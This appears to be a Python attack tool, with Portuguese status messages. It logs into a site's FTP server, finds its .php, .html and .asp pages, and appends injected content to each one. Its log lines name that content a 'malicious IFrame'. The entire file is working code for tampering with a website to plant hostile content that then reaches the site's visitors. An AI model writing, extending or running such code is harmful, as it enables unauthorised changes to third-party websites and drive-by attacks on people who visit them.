import ftplib
import io


class FTPClient:
    
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.ftp = None
        self.current_dir: str = '/'

    def connect_ftp(self):
        try:
            ftp = ftplib.FTP(host=self.host, timeout=5)
            connect = ftp.login(self.user, self.password)
            
            if all(x in connect.lower() for x in ['230', 'login successful.']):
                self.ftp = ftp
                print(connect)
                return True
            return False
        except Exception as e:
            pass

    def page_inject(self, file_name, content):
        buffer = io.BytesIO()
        try:
            self.ftp.retrbinary(f'RETR {file_name}', buffer.write)
            print ('[+] Página baixada: ' + file_name)
            buffer.write(f'\n{content}'.encode())
            print ('[+] Injetado IFrame malicioso em: ' + file_name)
            buffer.seek(0)
            self.ftp.storbinary(f'STOR {file_name}', buffer)
            print ('[+] Página injetada enviada: ' + file_name)
        except Exception as e:
            print(e)
            pass
    
    def file_filter(self):
        try:
            list_dir = self.ftp.nlst()
        except:
            list_dir = []
            print ('[-] Não foi possível listar o conteúdo.')
            return

        list_files = []
        for fileName in list_dir:
            fn = fileName.lower()
            if '.php' in fn or '.html' in fn or '.asp' in fn:
                print ('[+] Encontrado a página padrão: ' + fileName)
                list_files.append(fileName)
        return list_files